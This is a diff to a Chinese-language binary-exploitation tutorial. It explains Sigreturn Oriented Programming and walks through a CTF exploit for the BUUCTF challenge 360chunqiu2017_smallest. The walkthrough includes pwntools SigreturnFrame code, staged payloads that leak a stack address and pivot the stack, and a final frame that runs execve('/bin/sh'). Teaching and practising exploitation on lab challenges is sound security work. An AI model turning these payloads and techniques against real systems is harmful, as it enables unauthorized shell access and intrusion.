@@ -1990,23 +1990,151 @@ SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它�
 
 **`sys_sigreturn` 会盲目地相信栈上的数据，并把它们塞进寄存器。**
 
-那如果我们在栈溢出时，在栈上伪造一个我们自己精心设计的 Signal Frame 呢？
+首先 `syscall` 会检查 rax 所存储的系统调用号，比如当 `rax = 1` 执行 `sys_write`，当 `rax = 15` 执行 `sys_sigreturn`，当 `rax = 59` 执行 `execve`。
 
-1. 栈溢出：利用溢出漏洞，把一段伪造的 Signal Frame 写入栈中。在这个伪造的结构里，我们可以把 `rip` 设置为 `syscall` 的地址，把 `rax` 设置为 59 (代表 `execve`)，把 `rdi` 设置为 `/bin/sh` 的地址等等。
+所以我们只需要在 rsp 指向的地方 syscall_ret，并在下一个放 sig frame，就可以 SROP 劫持所有的寄存器。
 
-2. 触发 `sigreturn`：在覆盖返回地址时，我们让程序去执行 `sys_sigreturn` 这个系统调用。
+形如：
 
-3. 劫持执行流：内核收到 sigreturn 请求后，会读取我们伪造的 Signal Frame。瞬间，所有的寄存器都被赋予了我们想要的值。
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `-0x20` | `syscall` | `<- rsp` |
+| `-0x28` | `frame1` |  |
+| `.....` |  |  |
 
-最终，我们的寄存器状态如下：
+值得一提的是，sigframe 的长度在 64 位系统中，pwntools 默认是 0xF8，并且 sigframe 的前几个字节覆盖也不会对 SROP 的实际效果产生影响，它的前 8 个字符通常是 `uc_flags`，具体是什么不用管，总之执行 SROP 时不检查它。
 
-* `rax` = 59 （`execve`）
-* `rdi` = "/bin/sh" 所在的地址
-* `rsi` = 0 （没有附加参数）
-* `rdx` = 0 （没有环境变量）
-* `rip` = syscall 指令的地址 （把这些数据提交给内核）
+在攻击中，我们最后的目的往往是使得
 
-#### 例题 1：ciscn_2019_s_3
+```
+	frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+```
+
+能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常要先泄露一个栈的地址：
+
+* 方案 1 ：动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
+* 方案 2 ：栈迁移使 binsh 被写在一个确定的位置。
+
+#### 例题 1：360chunqiu2017_smallest
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#360chunqiu2017_smallest)
+
+64位程序，只开启了NX保护，程序非常简单。
+
+<img width="1087" height="197" alt="image" src="https://github.com/user-attachments/assets/387bd309-de16-4c44-bc64-2f026f7bdbd2" />
+
+tips：`read()`会返回读入字符的长度，而程序在调用 call 之后的返回值一般是保存在rax中的，所以我们可以通过执行 read 之后的读入的字符长度，来控制 rax 的值。
+
+Phase 1：泄露栈地址
+
+`payload_1 = p64(start) * 3`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x0` | `start` | `<- ret` |
+| `0x8` | `start` |  |
+| `0x10` | `start` |  |
+
+第一次读入结束，ret start 再读入，rsp 下移 8 位。
+
+`payload_2 = '\xB3', rax=1 (sys.write)`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x8` | `0x4000B3` | `<- ret` |
+| `0x10` | `0x4000B0` |  |
+
+第二次读入结束，ret 0x4000B3，rsp 下移 8 位，跳过了 `xor     rax, rax`，直到执行到 syscall：
+
+`edx = 0x400, rsi = rsp, rdi = rax = 1`
+syscall 执行 `sys.write(1, rsp, 0x400)`
+
+此时输出的前 8 个字节是 0x10 处的 0x4000B0，第 9 到 16 个字节是 0x18 处的栈地址，记为 stack_addr.
+
+---
+
+Phase 2：第一次 SROP (准备栈迁移)
+
+ret start再读入，rsp下移 8位。
+
+`payload_3 = p64(start) + b'A'*8 + bytes(frame1)`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x18` | `0x4000B0` | `<- ret` |
+| `0x20` | `AAAAAAAA` |  |
+| `0x28` | `frame1` |  |
+| `.....` |  |  |
+
+这里填 8 个 A 给 syscall 留位置，方便下一次输入 15 个字符，使 `rax = 15` 执行 sigreturn。
+
+---
+
+Phase 3：触发第一次 SROP
+
+ret start再读入，rsp 下移 8 位指向 `0x20`。
+
+`sigreturn = p64(syscall_ret) + b'\x00'*7`, `rax=15`, 触发 sigreturn.
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x20` | `syscall` | `<- rsp` |
+| `0x28` | `frame1` |  |
+| `.....` |  |  |
+
+*(frame1 前 7 个字节被覆盖为 `\x00`，但不影响).*
+```
+	frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = stack_addr
+    frame1.rdx = 0x400
+    frame1.rsp = stack_addr
+    frame1.rip = syscall_ret
+```
+---
+
+### Phase 4 & 5：在受控栈上构造第二次 SROP
+
+触发 sigreturn 后，rsp 被改为 stack_addr，并执行 `read(0, stack_addr, 0x400)`
+
+这样我们 binsh 所写的位置就已知并且可控了。
+
+```
+	frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+```
+
+
+`payload_4 = p64(start) + b'B'*8 + bytes(frame2)`
+
+`payload_4 = payload_4.ljust(0x300, b'\x00') + b'/bin/sh\x00'`
+
+`binsh = stack_addr + 0x300`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `stack_addr` | `0x4000B0` |  |
+| `stack_addr + 0x08` | `BBBBBBBB` |  |
+| `stack_addr + 0x10` | `sigframe` |  |
+| `.....` | `00000000` |  |
+| `stack_addr + 0x300` | `/bin/sh` |  |
+
+---
+
+
+最后再 ret start 重新读入，rsp 向下移 8 位，`sigreturn = p64(syscall_ret) + b'\x00'*7` 执行 execve。
+
+#### 例题 2：ciscn_2019_s_3
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
 
